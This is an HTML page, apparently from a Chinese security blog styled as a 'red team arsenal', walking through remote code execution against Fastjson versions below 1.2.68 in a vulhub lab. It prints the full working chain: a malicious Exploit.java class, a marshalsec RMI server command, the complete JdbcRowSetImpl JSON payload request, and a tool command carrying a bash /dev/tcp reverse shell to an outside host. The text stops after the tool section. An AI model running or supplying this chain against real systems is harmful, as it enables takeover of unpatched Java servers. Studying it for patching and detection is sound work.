@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="0x01漏洞介绍Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。 0x02影响范围Fastjson &lt; 1.2.68 Fastjson爆出的绕过方法可以通杀1.2.68">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红队武器库:fastjson小于1.2.68全漏洞RCE利用exp复现">
+<meta property="og:url" content="https://godzeo.github.io/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Zeo 安全实验室">
+<meta property="og:description" content="0x01漏洞介绍Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。 0x02影响范围Fastjson &lt; 1.2.68 Fastjson爆出的绕过方法可以通杀1.2.68">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxMTE3NDUucG5n?x-oss-process=image/format,png">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDMyMzQ3NDgucG5n?x-oss-process=image/format,png">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDMyMzQxMTUucG5n?x-oss-process=image/format,png">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDMyMzQ3NTQucG5n?x-oss-process=image/format,png">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDMyMzQ5MTQucG5n?x-oss-process=image/format,png">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxNjI2MTcucG5n?x-oss-process=image/format,png">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxNjI4NDQucG5n?x-oss-process=image/format,png">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxNjI5MjIucG5n?x-oss-process=image/format,png">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxNjMxNTAucG5n?x-oss-process=image/format,png">
+<meta property="article:published_time" content="2020-07-04T03:56:02.000Z">
+<meta property="article:modified_time" content="2020-08-01T08:32:02.689Z">
+<meta property="article:author" content="Zeo">
+<meta property="article:tag" content="WEB安全">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="内网">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="二进制">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxMTE3NDUucG5n?x-oss-process=image/format,png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>红队武器库:fastjson小于1.2.68全漏洞RCE利用exp复现</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Zeo 安全实验室" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/categories">分类</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/07/02/%E5%86%85%E7%BD%91%E4%B8%ADCobaltStrike4.0%EF%BC%88CS4%EF%BC%89%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://godzeo.github.io/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://godzeo.github.io/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp%E5%A4%8D%E7%8E%B0/&text=红队武器库:fastjson小于1.2.68全漏洞RCE利用exp复现" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://godzeo.github.io/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp%E5%A4%8D%E7%8E%B0/&title=红队武器库:fastjson小于1.2.68全漏洞RCE利用exp复现" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godzeo.github.io/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp%E5%A4%8D%E7%8E%B0/&is_video=false&description=红队武器库:fastjson小于1.2.68全漏洞RCE利用exp复现" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=红队武器库:fastjson小于1.2.68全漏洞RCE利用exp复现&body=Check out this article: https://godzeo.github.io/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp%E5%A4%8D%E7%8E%B0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://godzeo.github.io/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp%E5%A4%8D%E7%8E%B0/&title=红队武器库:fastjson小于1.2.68全漏洞RCE利用exp复现" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://godzeo.github.io/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp%E5%A4%8D%E7%8E%B0/&title=红队武器库:fastjson小于1.2.68全漏洞RCE利用exp复现" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://godzeo.github.io/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp%E5%A4%8D%E7%8E%B0/&title=红队武器库:fastjson小于1.2.68全漏洞RCE利用exp复现" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://godzeo.github.io/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp%E5%A4%8D%E7%8E%B0/&title=红队武器库:fastjson小于1.2.68全漏洞RCE利用exp复现" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://godzeo.github.io/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp%E5%A4%8D%E7%8E%B0/&name=红队武器库:fastjson小于1.2.68全漏洞RCE利用exp复现&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://godzeo.github.io/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp%E5%A4%8D%E7%8E%B0/&t=红队武器库:fastjson小于1.2.68全漏洞RCE利用exp复现" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01漏洞介绍"><span class="toc-number">1.</span> <span class="toc-text">0x01漏洞介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02影响范围"><span class="toc-number">2.</span> <span class="toc-text">0x02影响范围</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03漏洞复现"><span class="toc-number">3.</span> <span class="toc-text">0x03漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#下面是流程示意图"><span class="toc-number">3.1.</span> <span class="toc-text">下面是流程示意图</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#在整个远程命令执行流程"><span class="toc-number">3.1.1.</span> <span class="toc-text">在整个远程命令执行流程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04复现流程"><span class="toc-number">4.</span> <span class="toc-text">0x04复现流程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x041-构造恶意方法"><span class="toc-number">4.1.</span> <span class="toc-text">0x041 构造恶意方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x042-开启远程方法调用rmi服务"><span class="toc-number">4.2.</span> <span class="toc-text">0x042 开启远程方法调用rmi服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x043-发送payload"><span class="toc-number">4.3.</span> <span class="toc-text">0x043 发送payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05简化版攻击工具"><span class="toc-number">5.</span> <span class="toc-text">0x05简化版攻击工具</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-漏洞检测"><span class="toc-number">6.</span> <span class="toc-text">0x06 漏洞检测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#未知目标是否使用-Fastjson-，但站点有原始报错回显"><span class="toc-number">6.1.</span> <span class="toc-text">未知目标是否使用 Fastjson ，但站点有原始报错回显</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#无回显，通过DNS回显的方式盲区分-Fastjson-和-Jackson"><span class="toc-number">6.2.</span> <span class="toc-text">无回显，通过DNS回显的方式盲区分 Fastjson 和 Jackson</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#最新版本1-2-67依然可以通过dnslog判断后端是否使用fastjson"><span class="toc-number">6.3.</span> <span class="toc-text">最新版本1.2.67依然可以通过dnslog判断后端是否使用fastjson</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-多版本payload集合"><span class="toc-number">7.</span> <span class="toc-text">0x07 多版本payload集合</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-lt-1-2-24"><span class="toc-number">7.0.1.</span> <span class="toc-text">fastjson&lt;&#x3D;1.2.24</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-lt-1-2-41"><span class="toc-number">7.0.2.</span> <span class="toc-text">fastjson&lt;&#x3D;1.2.41</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-lt-1-2-42"><span class="toc-number">7.0.3.</span> <span class="toc-text">fastjson&lt;&#x3D;1.2.42</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-lt-1-2-43"><span class="toc-number">7.0.4.</span> <span class="toc-text">fastjson&lt;&#x3D;1.2.43</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-lt-1-2-45"><span class="toc-number">7.0.5.</span> <span class="toc-text">fastjson&lt;&#x3D;1.2.45</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-lt-1-2-47"><span class="toc-number">7.0.6.</span> <span class="toc-text">fastjson&lt;&#x3D;1.2.47</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-lt-1-2-62"><span class="toc-number">7.0.7.</span> <span class="toc-text">fastjson&lt;&#x3D;1.2.62</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-lt-1-2-66"><span class="toc-number">7.0.8.</span> <span class="toc-text">fastjson&lt;&#x3D;1.2.66</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        红队武器库:fastjson小于1.2.68全漏洞RCE利用exp复现
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Zeo 安全实验室</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-07-04T03:56:02.000Z" itemprop="datePublished">2020-07-04</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/WEB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/">WEB漏洞复现和分析</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <a id="more"></a>
+
+
+
+<h1 id="0x01漏洞介绍"><a href="#0x01漏洞介绍" class="headerlink" title="0x01漏洞介绍"></a>0x01漏洞介绍</h1><p>Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</p>
+<h1 id="0x02影响范围"><a href="#0x02影响范围" class="headerlink" title="0x02影响范围"></a>0x02影响范围</h1><p>Fastjson &lt; 1.2.68</p>
+<p>Fastjson爆出的绕过方法可以通杀1.2.68版本以下所有</p>
+<h1 id="0x03漏洞复现"><a href="#0x03漏洞复现" class="headerlink" title="0x03漏洞复现"></a>0x03漏洞复现</h1><p>下面以Fastjson 1.2.47 为例子，因为vulhub有现成的环境十分方便</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P牛我用vulhub中的 1.2.47的docker   想测试doslog检查 fastjson 但是总是收到不到dnslog  但是正常的exp反弹shell就是可以我很疑惑    </span><br><span class="line">我的用法正确吗，用的这个&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;bouaiq.dnslog.cn&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="下面是流程示意图"><a href="#下面是流程示意图" class="headerlink" title="下面是流程示意图"></a>下面是流程示意图</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxMTE3NDUucG5n?x-oss-process=image/format,png" alt="image-20200704111745527"></p>
+<p>主机A：存在fastjson反序列化漏洞的主机<br>主机C：为RMI/LDAP服务<br>主机B：为构造的恶意类（包含要执行的命令）</p>
+<h3 id="在整个远程命令执行流程"><a href="#在整个远程命令执行流程" class="headerlink" title="在整个远程命令执行流程"></a>在整个远程命令执行流程</h3><p>1、黑客使用payload攻击主机A（该payload需要指定rmi/ldap地址）</p>
+<p>2、主机A引发反序列化漏洞，发送了进行rmi远程发放调用，去连接主机C</p>
+<p>3、主机C的rmi服务指定加载主机B的恶意java类，所以主机A通过主机C的rmi服务最终加载并执行主机B的恶意java类</p>
+<p>4、主机A引发恶意系统命令执行</p>
+<h1 id="0x04复现流程"><a href="#0x04复现流程" class="headerlink" title="0x04复现流程"></a>0x04复现流程</h1><p>根据上图流程和环境复现：</p>
+<p>主机A： <a href="http://1.1.1.1:8090/" target="_blank" rel="noopener">http://1.1.1.1:8090</a> (存在Fastjson漏洞主机)<br>主机B： <a href="http://2.2.2.2:8888/" target="_blank" rel="noopener">http://2.2.2.2:8888</a> (恶意java类服务)<br>主机C： rmi://2.2.2.2:9999 (远程方法调用服务)</p>
+<p>实际上主机B和C是一台机器不同端口）</p>
+<h2 id="0x041-构造恶意方法"><a href="#0x041-构造恶意方法" class="headerlink" title="0x041 构造恶意方法"></a>0x041 构造恶意方法</h2><p>目标环境是<code>openjdk:8u102</code>，这个版本没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，我们可以简单利用RMI进行命令执行。</p>
+<p>首先编译并上传命令执行代码</p>
+<p>使用如下payload：</p>
+<p>其中touch /zydx666为系统命令，可以根据自己需求随意修改</p>
+<p>注意该文件名叫Exploit.java固定格式不能变</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Exploit() throws <span class="keyword">Exception</span> &#123;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"bash"</span>, <span class="string">"-c"</span>, <span class="string">"touch /zydx666"</span>&#125;);</span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> void main(String[] args) throws <span class="keyword">Exception</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在主机B中使用javac命令编译Exploit.java文件，生成一个Exploit.class文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Exploit.java</span><br></pre></td></tr></table></figure>
+
+<p>然后在主机B启一个http服务，中间件随意，但是需要能访问到Exploit.class文件，这里使用python3临时启动一个</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server --bind <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x042-开启远程方法调用rmi服务"><a href="#0x042-开启远程方法调用rmi服务" class="headerlink" title="0x042 开启远程方法调用rmi服务"></a>0x042 开启远程方法调用rmi服务</h2><p>接下来在<strong>主机C</strong>开启rmi服务</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://1.1.1.1:8888/#Exploit" 9999</span><br></pre></td></tr></table></figure>
+
+<p>marshalsec-0.0.3-SNAPSHOT-all.jar</p>
+<p>参考 <a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec</a></p>
+<p>至此服务已经全部就绪</p>
+<h2 id="0x043-发送payload"><a href="#0x043-发送payload" class="headerlink" title="0x043 发送payload"></a>0x043 发送payload</h2><p>接下来向<strong>主机A</strong>（存在漏洞机子）发送fastjson反序列化漏洞payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span>:<span class="number">8090</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 260</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    "a":&#123;</span></span><br><span class="line"><span class="comment">        "<span class="doctag">@type</span>":"java.lang.Class",</span></span><br><span class="line"><span class="comment">        "val":"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    "b":&#123;</span></span><br><span class="line"><span class="comment">        "<span class="doctag">@type</span>":"com.sun.rowset.JdbcRowSetImpl",</span></span><br><span class="line"><span class="comment">        "dataSourceName":"rmi://2.2.2.2:9999/Exploit",</span></span><br><span class="line"><span class="comment">        "autoCommit":true</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>此时主机A收到POST请求，触发反序列化漏洞，最终执行Exploit.class 文件中的内容</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDMyMzQ3NDgucG5n?x-oss-process=image/format,png" alt="image-20200703234748062"></p>
+<p>我使用的是反弹shell命令</p>
+<p>反弹shell成功：</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDMyMzQxMTUucG5n?x-oss-process=image/format,png" alt="image-20200703234115010"></p>
+<h1 id="0x05简化版攻击工具"><a href="#0x05简化版攻击工具" class="headerlink" title="0x05简化版攻击工具"></a>0x05简化版攻击工具</h1><p>下面提供一个简化版工具的工具</p>
+<p>是使用<a href="https://github.com/wyzxxz/fastjson\_rce\_tool这位师傅写的，一键起服务和生成恶意代码整个rmi+class文件的jar包" target="_blank" rel="noopener">https://github.com/wyzxxz/fastjson\_rce\_tool这位师傅写的，一键起服务和生成恶意代码整个rmi+class文件的jar包</a></p>
+<p>第一步：只需要在自己的服务器上启动</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp fastjson_tool.jar fastjson.HRMIServer 1.1.1.1 8888 &quot;bash&#x3D;bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;80 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+
+<p>第二步：发送payload</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDMyMzQ3NTQucG5n?x-oss-process=image/format,png" alt=""></p>
+<p>成功反弹shell</p>
